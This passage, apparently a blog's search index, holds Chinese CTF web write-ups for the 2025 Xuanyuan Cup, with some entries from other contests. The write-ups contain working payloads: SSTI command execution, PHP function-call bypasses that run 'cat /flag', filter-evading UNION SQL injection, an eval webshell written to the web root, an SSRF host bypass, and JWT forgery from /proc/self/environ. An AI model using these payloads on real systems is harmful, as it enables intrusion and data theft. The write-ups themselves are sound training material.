<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>LitCTF2025_web</title>
    <link href="/2025/05/28/LitCTF2025-web/"/>
    <url>/2025/05/28/LitCTF2025-web/</url>
    
    <content type="html"><![CDATA[<h3 id="easy-file"><a href="#easy-file" class="headerlink" title="easy_file"></a>easy_file</h3><h3 id="nest-js"><a href="#nest-js" class="headerlink" title="nest_js"></a>nest_js</h3><h3 id="星愿信箱"><a href="#星愿信箱" class="headerlink" title="星愿信箱"></a>星愿信箱</h3><h3 id="多重宇宙日记"><a href="#多重宇宙日记" class="headerlink" title="多重宇宙日记"></a>多重宇宙日记</h3><h3 id="easy-signin"><a href="#easy-signin" class="headerlink" title="easy_signin"></a>easy_signin</h3><h3 id="君の名は"><a href="#君の名は" class="headerlink" title="君の名は"></a>君の名は</h3>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025轩辕杯_web</title>
    <link href="/2025/05/28/2025%E8%BD%A9%E8%BE%95%E6%9D%AF-web/"/>
    <url>/2025/05/28/2025%E8%BD%A9%E8%BE%95%E6%9D%AF-web/</url>
    
    <content type="html"><![CDATA[<h2 id="ezflask"><a href="#ezflask" class="headerlink" title="ezflask"></a>ezflask</h2><p>这里主要是过滤部分关键词，直接用拼接绕过</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">&#123;&#123;url_for<span class="hljs-selector-attr">[<span class="hljs-string">&quot;__glo&quot;</span><span class="hljs-string">&quot;bals__&quot;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;o&quot;</span><span class="hljs-string">&quot;s&quot;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;po&quot;</span><span class="hljs-string">&quot;pen&quot;</span>]</span>(&quot;strings /f*&quot;)<span class="hljs-selector-attr">[<span class="hljs-string">&quot;re&quot;</span><span class="hljs-string">&quot;ad&quot;</span>]</span>()&#125;&#125;<br></code></pre></td></tr></table></figure><p>也可以直接用fenjing一把梭</p><p><img src="/2025/05/28/2025%E8%BD%A9%E8%BE%95%E6%9D%AF-web/ezflask.png"></p><h2 id="ezjs"><a href="#ezjs" class="headerlink" title="ezjs"></a>ezjs</h2><p>源码中发现</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs arcade">game._addSuccessFn(<span class="hljs-keyword">function</span> (<span class="hljs-params">scoreNow</span>) &#123;<br>    current_score.innerHTML = scoreNow<br><br>    <span class="hljs-keyword">if</span> (scoreNow === <span class="hljs-number">100000000000</span>) &#123;<br>        fetch(<span class="hljs-string">&#x27;getflag.php&#x27;</span>, &#123;<br>            <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>            <span class="hljs-attr">headers</span>: &#123;<br>                <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>            &#125;,<br>            <span class="hljs-attr">body</span>: <span class="hljs-string">&#x27;score=&#x27;</span> + scoreNow<br>        &#125;)<br>        .then(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-built_in">text</span>())<br>        .then(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> &#123;<br>            alert(<span class="hljs-string">&quot;恭喜你！flag是：&quot;</span> + data);<br>        &#125;)<br>        .<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> &#123;<br>            <span class="hljs-built_in">console</span>.error(<span class="hljs-string">&#x27;错误:&#x27;</span>, error);<br>        &#125;);<br>    &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>如果当前得分scoreNow达到100000000000，则向服务器发送请求获取flag</p><p>直接post传score&#x3D;100000000000，然后访getflag.php即可</p><p><img src="/2025/05/28/2025%E8%BD%A9%E8%BE%95%E6%9D%AF-web/ezjs.png"></p><h2 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>) </span>&#123;<br>    <span class="hljs-variable">$disable_fun</span> = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;shell_exec&quot;</span>, <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;passthru&quot;</span>, <span class="hljs-string">&quot;proc_open&quot;</span>, <span class="hljs-string">&quot;show_source&quot;</span>, <br>        <span class="hljs-string">&quot;phpinfo&quot;</span>, <span class="hljs-string">&quot;popen&quot;</span>, <span class="hljs-string">&quot;dl&quot;</span>, <span class="hljs-string">&quot;proc_terminate&quot;</span>, <span class="hljs-string">&quot;touch&quot;</span>, <span class="hljs-string">&quot;escapeshellcmd&quot;</span>, <br>        <span class="hljs-string">&quot;escapeshellarg&quot;</span>, <span class="hljs-string">&quot;assert&quot;</span>, <span class="hljs-string">&quot;substr_replace&quot;</span>, <span class="hljs-string">&quot;call_user_func_array&quot;</span>, <br>        <span class="hljs-string">&quot;call_user_func&quot;</span>, <span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_map&quot;</span>, <br>        <span class="hljs-string">&quot;register_shutdown_function&quot;</span>, <span class="hljs-string">&quot;register_tick_function&quot;</span>, <span class="hljs-string">&quot;filter_var&quot;</span>, <br>        <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>, <br>        <span class="hljs-string">&quot;array_walk_recursive&quot;</span>, <span class="hljs-string">&quot;pcntl_exec&quot;</span>, <span class="hljs-string">&quot;fopen&quot;</span>, <span class="hljs-string">&quot;fwrite&quot;</span>, <br>        <span class="hljs-string">&quot;file_put_contents&quot;</span>, <span class="hljs-string">&quot;readfile&quot;</span>, <span class="hljs-string">&quot;file_get_contents&quot;</span>, <span class="hljs-string">&quot;highlight_file&quot;</span>, <span class="hljs-string">&quot;eval&quot;</span><br>    );<br>    <br>    <span class="hljs-variable">$disable_fun</span> = <span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-string">&#x27;strtolower&#x27;</span>, <span class="hljs-variable">$disable_fun</span>);<br>    <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$a</span>);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$disable_fun</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;宝宝这对嘛,这不对噢&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$a</span>;<br>&#125;<br><br><span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br><span class="hljs-variable">$new</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;new&#x27;</span>];<br><span class="hljs-variable">$star</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;star&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$num</span>) &amp;&amp; <span class="hljs-variable">$num</span> != <span class="hljs-number">1234</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;看来第一层对你来说是小case&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$num</span>) &amp;&amp; <span class="hljs-variable">$num</span> &gt; <span class="hljs-number">1234</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;还是有点实力的嘛&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$new</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$star</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;看起来你遇到难关了哈哈&lt;br&gt;&quot;</span>;<br>            <span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$new</span>); <br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$b</span>) &#123; <br>                <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$b</span>, <span class="hljs-variable">$star</span>); <br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;恭喜你，又成长了&lt;br&gt;&quot;</span>;<br>            &#125; <br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>第一层num&#x3D;1235</p><p>第二层</p><blockquote><p>new&#x3D;\system&amp;star&#x3D;cat &#x2F;flag#利用转义绕过</p><p>new&#x3D;readgzfile&amp;star&#x3D;&#x2F;flag#readgzfile读取一个gzip的文件并输出其内容，类似于readfile()</p></blockquote><h2 id="ezsql1-0"><a href="#ezsql1-0" class="headerlink" title="ezsql1.0"></a>ezsql1.0</h2><p>ban了空格，select被替换为空</p><p>空格用&#x2F;**&#x2F;绕过，select通过selselectect双写绕过</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span>selselectect<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">schema_name</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.schemata#//查库<br><span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span>selselectect<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">table_name</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.<span class="hljs-keyword">tables</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_schema=<span class="hljs-string">&#x27;xuanyuanCTF&#x27;</span>#//查表<br><span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span>selselectect<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">column_name</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.<span class="hljs-keyword">columns</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;info&#x27;</span>#//查字段<br><span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span>selselectect<span class="hljs-comment">/**/</span>id,title,content<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>xuanyuanCTF.<span class="hljs-keyword">info</span>#//拿flag<br></code></pre></td></tr></table></figure><p>除了上面的联合注入外，还可以通过写马的方式拿flag</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">union</span><span class="hljs-comment">/**/</span>selselectect<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;&lt;?=eval($_POST[1])?&gt;&#x27;</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">into</span><span class="hljs-comment">/**/</span>outfile<span class="hljs-comment">/**/</span><span class="hljs-string">&#x27;/var/www/html/1.php&#x27;</span><br></code></pre></td></tr></table></figure><p>蚁剑连接，在&#x2F;var目录下发现db.sql</p><p><img src="/2025/05/28/2025%E8%BD%A9%E8%BE%95%E6%9D%AF-web/ezsql.png"></p><p>解码得到flag</p><h2 id="ezssrf1-0"><a href="#ezssrf1-0" class="headerlink" title="ezssrf1.0"></a>ezssrf1.0</h2><p>dirsearch发现&#x2F;flag且可以访问，访问后得到提示“flag in FFFFF11111AAAAAggggg.php”，直接访问FFFFF11111AAAAAggggg.php得到flag</p><p>看了官方的wp说这一题本应该只允许本地访问，所以预期应该是要利用畸形的url使parse_url无法识别host，从而绕过检查</p><blockquote><p>?url&#x3D;http:<a href="mailto:&#120;&#117;&#x40;&#x31;&#x32;&#x37;&#x2e;&#x30;&#x2e;&#x30;&#x2e;&#x31;">xu@127.0.0.1</a>&#x2F;flag</p></blockquote><p><img src="/2025/05/28/2025%E8%BD%A9%E8%BE%95%E6%9D%AF-web/ezssrf.png"></p><p>然后再访问FFFFF11111AAAAAggggg.php，拿到flag</p><h2 id="ez-web1"><a href="#ez-web1" class="headerlink" title="ez_web1"></a>ez_web1</h2><p>ctrl+u源码中有提示，username为“fly233”，然后password是一个九位数的口令，猜测为弱口令“123456789”，成功登录，进入一个图书阅览界面，bp抓个包，发现是通过post给&#x2F;read路由，然后由book_path来控制读取的文件，尝试读一下源码&#x2F;app&#x2F;app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, redirect, url_for, make_response, jsonify<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> jwt<br><br><br>app = Flask(__name__, template_folder=<span class="hljs-string">&#x27;templates&#x27;</span>)<br>app.config[<span class="hljs-string">&#x27;TEMPLATES_AUTO_RELOAD&#x27;</span>] = <span class="hljs-literal">True</span><br>SECRET_KEY = os.getenv(<span class="hljs-string">&#x27;JWT_KEY&#x27;</span>)<br>book_dir = <span class="hljs-string">&#x27;books&#x27;</span><br>users = &#123;<span class="hljs-string">&#x27;fly233&#x27;</span>: <span class="hljs-string">&#x27;123456789&#x27;</span>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_token</span>(<span class="hljs-params">username</span>):<br>    payload = &#123;<br>        <span class="hljs-string">&#x27;username&#x27;</span>: username<br>    &#125;<br>    token = jwt.encode(payload, SECRET_KEY, algorithm=<span class="hljs-string">&#x27;HS256&#x27;</span>)<br>    <span class="hljs-keyword">return</span> token<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_token</span>(<span class="hljs-params">token</span>):<br>    <span class="hljs-keyword">try</span>:<br>        payload = jwt.decode(token, SECRET_KEY, algorithms=[<span class="hljs-string">&#x27;HS256&#x27;</span>])<br>        <span class="hljs-keyword">return</span> payload<br>    <span class="hljs-keyword">except</span> jwt.ExpiredSignatureError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">except</span> jwt.InvalidTokenError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    token = request.cookies.get(<span class="hljs-string">&#x27;token&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> token:<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/login&#x27;</span>)<br>    payload = decode_token(token)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> payload:<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/login&#x27;</span>)<br>    username = payload[<span class="hljs-string">&#x27;username&#x27;</span>]<br>    books = [f <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> os.listdir(book_dir) <span class="hljs-keyword">if</span> f.endswith(<span class="hljs-string">&#x27;.txt&#x27;</span>)]<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;./index.html&#x27;</span>, username=username, books=books)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        <br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;./login.html&#x27;</span>)<br>    <span class="hljs-keyword">elif</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <br>        username = request.form.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>        password = request.form.get(<span class="hljs-string">&#x27;password&#x27;</span>)<br><br>        <br>        <span class="hljs-keyword">if</span> username <span class="hljs-keyword">in</span> users <span class="hljs-keyword">and</span> users[username] == password:<br>            token = generate_token(username)<br>            response = make_response(jsonify(&#123;<br>                <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;success&#x27;</span><br>            &#125;), <span class="hljs-number">200</span>)<br>           <br>            response.set_cookie(<span class="hljs-string">&#x27;token&#x27;</span>, token, httponly=<span class="hljs-literal">True</span>, path=<span class="hljs-string">&#x27;/&#x27;</span>)<br>            <span class="hljs-keyword">return</span> response<br>        <span class="hljs-keyword">else</span>:<br>            <br>            <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;Invalid username or password&#x27;</span>&#125;<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_book</span>():<br>    token = request.cookies.get(<span class="hljs-string">&#x27;token&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> token:<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/login&#x27;</span>)<br>    payload = decode_token(token)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> payload:<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/login&#x27;</span>)<br>    book_path = request.form.get(<span class="hljs-string">&#x27;book_path&#x27;</span>)<br>    full_path = os.path.join(book_dir, book_path)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(full_path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>            content = file.read()<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;reading.html&#x27;</span>, content=content)<br>    <span class="hljs-keyword">except</span> FileNotFoundError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;文件未找到&quot;</span>, <span class="hljs-number">404</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;发生错误: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>, <span class="hljs-number">500</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br>    token = request.cookies.get(<span class="hljs-string">&#x27;token&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> token:<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/login&#x27;</span>)<br>    payload = decode_token(token)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> payload:<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/login&#x27;</span>)<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        <br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;./upload.html&#x27;</span>)<br>    <span class="hljs-keyword">if</span> payload.get(<span class="hljs-string">&#x27;username&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        &lt;script&gt;</span><br><span class="hljs-string">            alert(&#x27;只有管理员才有添加图书的权限&#x27;);</span><br><span class="hljs-string">            window.location.href = &#x27;/&#x27;;</span><br><span class="hljs-string">        &lt;/script&gt;</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>    file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>    <span class="hljs-keyword">if</span> file:<br>        book_path = request.form.get(<span class="hljs-string">&#x27;book_path&#x27;</span>)<br>        file_path = os.path.join(book_path, file.filename)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(book_path):<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;文件夹不存在&quot;</span>, <span class="hljs-number">400</span><br>        file.save(file_path)<br><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            content = f.read()<br>            pattern = <span class="hljs-string">r&#x27;[&#123;&#125;&lt;&gt;_%]&#x27;</span><br><br>            <span class="hljs-keyword">if</span> re.search(pattern, content):<br>                os.remove(file_path)<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">                &lt;script&gt;</span><br><span class="hljs-string">                    alert(&#x27;SSTI,想的美！&#x27;);</span><br><span class="hljs-string">                    window.location.href = &#x27;/&#x27;;</span><br><span class="hljs-string">                &lt;/script&gt;</span><br><span class="hljs-string">                &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;未选择文件&quot;</span>, <span class="hljs-number">400</span><br></code></pre></td></tr></table></figure><p>阅读一下源码，应该是一个jwt伪造，然后上传一个文件通过&#x2F;read的render_template打ssti，但ssti的关键字符被waf了（如果没有文件内容检查且部署环境php模块被启用了，说不定还可以尝试打马）</p><p>在群里看见有佬说“ezweb可以直接写ssti到模板文件，赶在删除前竞争访问”，“upload可以直接覆盖上传模板文件”</p><p>那尝试去覆盖&#x2F;app&#x2F;templates&#x2F;reading.html，然后打条件竞争</p><p>先进行jwt伪造，从&#x2F;proc&#x2F;self&#x2F;environ读到JWT_KEY&#x3D;th1s_1s_k3y，伪造成admin</p><p><img src="/2025/05/28/2025%E8%BD%A9%E8%BE%95%E6%9D%AF-web/ezweb1.png"></p><p>然后上传reading.html，并读取该文件(有效载荷类型设置为“没有负载”，有效载荷选项勾选“无限期地重复”)</p><p>上传</p><p><img src="/2025/05/28/2025%E8%BD%A9%E8%BE%95%E6%9D%AF-web/ezweb2.png"></p><p>读</p><p><img src="/2025/05/28/2025%E8%BD%A9%E8%BE%95%E6%9D%AF-web/ezweb3.png"></p><p>flag</p><p><img src="/2025/05/28/2025%E8%BD%A9%E8%BE%95%E6%9D%AF-web/ezweb4.png"></p><p>看官方的wp可以从&#x2F;proc&#x2F;1&#x2F;environ中直接读到flag</p><p><img src="/2025/05/28/2025%E8%BD%A9%E8%BE%95%E6%9D%AF-web/ezweb5.png"></p><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>第一关：get传a&#x3D;welcome，post传b&#x3D;new，cookie中star值置为admin</p><p>第二关：get传password&#x3D;2025abc</p><p>第三关：Referer头改为secretcode，post传key&#x3D;ctfpass</p><p>第四关：将请求方法改为HEAD，ua头改为identity&#x3D;n1c3</p><p>第五关：提交key“W3lC0E_CtF”</p><p>最后一关：执行“strings &#x2F;f*”，拿到flag</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NewStar2024_web</title>
